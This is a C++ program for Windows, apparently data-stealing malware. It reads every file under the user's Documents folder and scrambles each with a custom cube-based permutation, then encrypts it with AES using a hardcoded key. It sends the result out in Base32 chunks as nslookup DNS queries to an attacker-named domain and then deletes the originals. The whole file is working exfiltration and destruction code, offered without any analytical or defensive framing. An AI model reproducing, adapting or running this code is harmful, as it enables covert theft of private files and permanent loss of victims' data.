#include <windows.h>
#include <openssl/sha.h>
#include <openssl/md5.h>
#include <openssl/evp.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <filesystem>

#define AES_BLOCK_SIZE 16

const std::string RUBIK_KEY = "D R2 F2 D B2 D2 R2 B2 D L2 D' R D B L2 B' L' R' B' F2 R2 D R2 B2 R2 D L2 D2 F2 R2 F' D' B2 D' B U B' L R' D'";
const unsigned char RUBIK_IV[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuv";

unsigned char AES_KEY[32];
unsigned char AES_IV[16];

namespace fs = std::filesystem;

void computeKeyAndIV() {
    unsigned int len;

    // SHA-256 for AES_KEY
    EVP_MD_CTX* shaCtx = EVP_MD_CTX_new();
    EVP_DigestInit_ex(shaCtx, EVP_sha256(), nullptr);
    EVP_DigestUpdate(shaCtx, RUBIK_KEY.c_str(), RUBIK_KEY.size());
    EVP_DigestFinal_ex(shaCtx, AES_KEY, &len);
    EVP_MD_CTX_free(shaCtx);

    // MD5 for AES_IV
    EVP_MD_CTX* md5Ctx = EVP_MD_CTX_new();
    EVP_DigestInit_ex(md5Ctx, EVP_md5(), nullptr);
    EVP_DigestUpdate(md5Ctx, RUBIK_IV, sizeof(RUBIK_IV) - 1);
    EVP_DigestFinal_ex(md5Ctx, AES_IV, &len);
    EVP_MD_CTX_free(md5Ctx);
}


// === Rubik cube faces ===
const int F[9] = {6,7,8,15,16,17,24,25,26};
const int R[9] = {2,5,8,11,14,17,20,23,26};
const int U[9] = {0,1,2,9,10,11,18,19,20};
const int L[9] = {0,3,6,9,12,15,18,21,24};
const int D[9] = {18,19,20,21,22,23,24,25,26};
const int B[9] = {0,1,2,3,4,5,6,7,8};

void rotate_face(std::vector<unsigned char>& cube, const int face_indices[9], bool clockwise) {
    unsigned char face[9];
    for (int i = 0; i < 9; ++i) face[i] = cube[face_indices[i]];
    unsigned char rotated[9];
    if (clockwise) {
        rotated[0]=face[6]; rotated[1]=face[3]; rotated[2]=face[0];
        rotated[3]=face[7]; rotated[4]=face[4]; rotated[5]=face[1];
        rotated[6]=face[8]; rotated[7]=face[5]; rotated[8]=face[2];
    } else {
        rotated[0]=face[2]; rotated[1]=face[5]; rotated[2]=face[8];
        rotated[3]=face[1]; rotated[4]=face[4]; rotated[5]=face[7];
        rotated[6]=face[0]; rotated[7]=face[3]; rotated[8]=face[6];
    }
    for (int i = 0; i < 9; ++i) cube[face_indices[i]] = rotated[i];
}

std::vector<unsigned char> rubik_permute_block(const std::vector<unsigned char>& block, const std::vector<std::string>& moves) {
    std::vector<unsigned char> cube(27, 0);
    for (size_t i = 0; i < block.size(); ++i) cube[i] = block[i];
    for (const auto& move : moves) {
        char face = move[0];
        bool clockwise = true;
        int times = 1;
        if (move.size() > 1) {
            if (move[1] == '2') times = 2;
            else if (move[1] == '\'') clockwise = false;
        }
        for (int t = 0; t < times; ++t) {
            switch (face) {
                case 'F': rotate_face(cube, F, clockwise); break;
                case 'R': rotate_face(cube, R, clockwise); break;
                case 'U': rotate_face(cube, U, clockwise); break;
                case 'L': rotate_face(cube, L, clockwise); break;
                case 'D': rotate_face(cube, D, clockwise); break;
                case 'B': rotate_face(cube, B, clockwise); break;
            }
        }
    }
    return cube;
}

std::vector<unsigned char> rubik_permute(const std::vector<unsigned char>& data, const std::vector<std::string>& moves) {
    std::vector<unsigned char> result;
    size_t pos = 0;
    while (pos < data.size()) {
        size_t len = std::min<size_t>(27, data.size() - pos);
        std::vector<unsigned char> block(27, 0);
        for (size_t i = 0; i < len; ++i) block[i] = data[pos + i];
        auto permuted = rubik_permute_block(block, moves);
        result.insert(result.end(), permuted.begin(), permuted.end());
        pos += len;
    }
    return result;
}

// === AES CBC ===
std::vector<unsigned char> aesEncrypt(const std::vector<unsigned char>& plaintext) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    std::vector<unsigned char> ciphertext(plaintext.size() + AES_BLOCK_SIZE);
    int len = 0, ciphertext_len = 0;

    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, AES_KEY, AES_IV);
    EVP_EncryptUpdate(ctx, ciphertext.data(), &len, plaintext.data(), plaintext.size());
    ciphertext_len = len;
    EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len);
    ciphertext_len += len;
    EVP_CIPHER_CTX_free(ctx);
    ciphertext.resize(ciphertext_len);
    return ciphertext;
}

// === Base32 ===
std::string base32Encode(const std::vector<unsigned char>& data) {
    static const char* base32Alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
    std::string encoded;
    int buffer = 0, bitsLeft = 0;
    for (unsigned char c : data) {
        buffer <<= 8;
        buffer |= c & 0xFF;
        bitsLeft += 8;
        while (bitsLeft >= 5) {
            encoded += base32Alphabet[(buffer >> (bitsLeft - 5)) & 0x1F];
            bitsLeft -= 5;
        }
    }
    if (bitsLeft > 0) {
        buffer <<= (5 - bitsLeft);
        encoded += base32Alphabet[buffer & 0x1F];
    }
    return encoded;
}

// === DNS Exfil ===
void exfiltrateViaDNS(const std::string& base32Data, const std::string& domain) {
    size_t pos = 0;
    int chunkId = 0;
    while (pos < base32Data.size()) {
        std::string chunk = base32Data.substr(pos, 40);
        std::ostringstream dnsName;
        dnsName << chunkId << "." << chunk << "." << domain;
        std::ostringstream command;
        command << "nslookup " << dnsName.str() << " >nul 2>&1";
        std::cout << "[>] Sending: " << dnsName.str() << std::endl;
        system(command.str().c_str());
        pos += 40;
        chunkId++;
        Sleep(100);
    }
}

// === Read File ===
std::vector<unsigned char> readFileBytes(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    return std::vector<unsigned char>((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

// === Process Files ===
void processAllFiles(const std::string& dirPath, const std::string& attackerDomain) {
    std::istringstream iss(RUBIK_KEY);
    std::vector<std::string> moves;
    for (std::string s; iss >> s;) moves.push_back(s);

    for (const auto& entry : fs::recursive_directory_iterator(dirPath)) {
        if (entry.is_regular_file()) {
            try {
                std::vector<unsigned char> data = readFileBytes(entry.path().string());
                auto permuted = rubik_permute(data, moves);
                auto encrypted = aesEncrypt(permuted);
                auto base32Encoded = base32Encode(encrypted);
                std::cout << "[*] Exfiltrating: " << entry.path().string() << std::endl;
                exfiltrateViaDNS(base32Encoded, attackerDomain);

                std::error_code ec;
                fs::remove(entry.path(), ec);
                if (ec) {
                    std::cerr << "[-] Failed to delete: " << entry.path() << " (" << ec.message() << ")" << std::endl;
                } else {
                    std::cout << "[+] Deleted: " << entry.path() << std::endl;
                }
            } catch (...) {
                std::cerr << "[-] Failed to process: " << entry.path() << std::endl;
            }
        }
    }
}

// === Main ===
int main() {
    computeKeyAndIV();

    char userProfile[512];
    DWORD len = GetEnvironmentVariableA("USERPROFILE", userProfile, sizeof(userProfile));
    if (len == 0 || len > sizeof(userProfile)) {
        std::cerr << "[-] Failed to get USERPROFILE" << std::endl;
        return 1;
    }
    std::string documentsDir = std::string(userProfile) + "\\Documents";
    std::string attackerDomain = "m4cr0suCk.com";

    std::cout << "[*] Starting exfiltration from: " << documentsDir << std::endl;
    processAllFiles(documentsDir, attackerDomain);
    return 0;
}
